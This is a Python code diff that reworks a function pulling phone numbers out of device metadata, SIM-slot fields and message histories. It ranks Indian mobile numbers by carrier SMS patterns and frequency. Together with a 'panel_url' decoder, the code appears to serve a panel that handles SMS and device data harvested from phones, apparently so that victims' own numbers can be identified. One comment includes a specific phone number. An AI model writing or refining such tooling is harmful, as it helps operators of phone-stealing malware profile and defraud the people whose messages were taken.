@@ -44,50 +44,73 @@ def decode_panel_url(panel_url):
     except Exception: pass
     return None
 
-# 🔥 MAHA-AGGRESSIVE NUMBER EXTRACTION
 def extract_best_numbers(dev_data, msgs):
     found_nums = {}
     bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890", "0000000000"}
 
-    # 1. Scan the ENTIRE device metadata (JSON dump) for any 10-digit number
-    raw_metadata = json.dumps(dev_data)
-    meta_matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', raw_metadata)
-    for m in meta_matches:
-        if m not in bad_numbers:
-            found_nums[m] = 100 # 100% Confirm if found in metadata
+    # 1. Check exact SIM / Phone metadata fields (100% Confirm)
+    for key in ["phoneNumber", "phone", "number", "mobile", "simSerialNumber"]:
+        if dev_data.get(key):
+            n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
+            if len(n) == 10 and n[0] in "6789" and n not in bad_numbers:
+                found_nums[n] = 100
+                
+    # Check SIM slots if available
+    if isinstance(dev_data.get("sims"), list):
+        for sim in dev_data["sims"]:
+            if isinstance(sim, dict):
+                for key in ["phoneNumber", "number"]:
+                    if sim.get(key):
+                        n = re.sub(r'\D', '', str(sim[key]))[-10:]
+                        if len(n) == 10 and n[0] in "6789" and n not in bad_numbers:
+                            found_nums[n] = 100
 
-    # 2. Scan Message History
+    # 2. Strict Carrier Regex (Jio Number 9238576124)
+    for m in msgs:
+        text = m.get("message", "")
+        sender = str(m.get("sender", "")).lower()
+        
+        # Check if message is from carrier or mentions carrier number
+        if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]) or any(c in text.lower() for c in ["jio number", "airtel number"]):
+            # Look for patterns like "Jio Number 9238576124" or "on Jio Number 9238576124"
+            carrier_match = re.search(r'(?:jio|airtel|vi|bsnl)\s+number\s+([6-9]\d{9})', text, re.IGNORECASE)
+            if carrier_match:
+                n = carrier_match.group(1)
+                if n not in bad_numbers:
+                    found_nums[n] = 100
+                    continue
+                    
+            # General fallback for carrier messages (if it's a direct notification)
+            if "your jio number" in text.lower() or "your airtel number" in text.lower():
+                match = re.search(r'\b([6-9]\d{9})\b', text)
+                if match and match.group(1) not in bad_numbers:
+                    found_nums[match.group(1)] = 100
+
+    # 3. General Message Regex (Frequent numbers)
     all_msg_text = " ".join([m.get("message", "") for m in msgs])
     msg_matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_msg_text)
     
     for num in set(msg_matches):
-        if num in bad_numbers: continue
+        if num in bad_numbers or num in found_nums: continue
         
-        score = 40 # Base score
+        score = 40
         is_carrier = False
         
-        # Check for Carrier messages (Jio/Airtel/Vi)
+        # Check if this number was sent by a carrier
         for m in msgs:
             sender = str(m.get("sender", "")).lower()
-            text = m.get("message", "").lower()
-            if num in text:
-                if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
-                    is_carrier = True
-                    break
-                if any(f"{c} number" in text for c in ["jio", "airtel", "vi"]):
-                    is_carrier = True
-                    break
-        
+            if num in m.get("message", "") and any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
+                is_carrier = True
+                break
+                
         if is_carrier: score = 100
         else: 
-            # Increase score based on repeat frequency
             count = msg_matches.count(num)
             score = min(score + (count * 10), 95)
             
         if num not in found_nums or score > found_nums[num]:
             found_nums[num] = score
 
-    # Sort and return top 2 max
     sorted_nums = sorted(found_nums.items(), key=lambda x: x[1], reverse=True)[:2]
     return sorted_nums
 
